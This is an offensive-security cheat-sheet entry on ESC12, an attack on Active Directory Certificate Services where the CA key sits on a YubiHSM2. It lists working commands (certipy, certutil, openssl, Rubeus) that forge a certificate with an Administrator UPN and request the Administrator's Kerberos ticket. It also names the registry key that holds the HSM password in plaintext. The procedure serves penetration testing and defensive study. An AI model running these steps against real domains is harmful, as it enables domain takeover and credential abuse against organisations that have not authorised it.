# Active Directory - Certificate ESC12

## ESC12 - ADCS CA on YubiHSM

> The ESC12 vulnerability occurs when a Certificate Authority (CA) stores its private key on a YubiHSM2 device, which requires an authentication key (password) to access. This password is stored in the registry in cleartext, allowing an attacker with shell access to the CA server to recover the private key.

**Requirements**:

* CA certificate
* Shell access on the root CA server

**Exploitation**:

* Generate a certicate for the user

  ```ps1
  certipy req -target dc-esc.esc.local -dc-ip 10.10.10.10 -u "user_esc12@esc.local" -p 'P@ssw0rd' -template User -ca <CA-Common-Name>
  certipy cert -pfx user_esc12.pfx -nokey -out user_esc12.crt
  certipy cert -pfx user_esc12.pfx -nocert -out user_esc12.key
  ```

* Importing the CA certificate into the user store

  ```ps1
  certutil -addstore -user my .\Root-CA-5.cer
  ```

* Associated with the private key in the YubiHSM2 device

  ```ps1
  certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA-Common-Name>
  ```

* Sign `user_esc12.crt` and specify a `Subject Alternative Name` using the `extension.inf` file.

  ```ps1
  certutil -sign ./user_esc12.crt new.crt @extension.inf
  ```

* Content of extension.inf

  ```cs
  [Extensions]
  2.5.29.17 = "{text}"
  _continue_ = "UPN=Administrator@esc.local&"
  ```

* Use the certificate to get the TGT of the Administrator

  ```ps1
  openssl.exe pkcs12 -export -in new.crt -inkey user_esc12.key -out user_esc12_Administrator.pfx
  Rubeus.exe asktgt /user:Administrator /certificate:user_esc12_Administrator.pfx /domain:esc.local /dc:192.168.1.2 /show /nowrap
  ```

Unlocking the YubiHSM with the plaintext password in the registry key: `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

## References

* [ESC12 – Shell access to ADCS CA with YubiHSM - hajo - October 2023](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
* [Exploitation de l’AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)
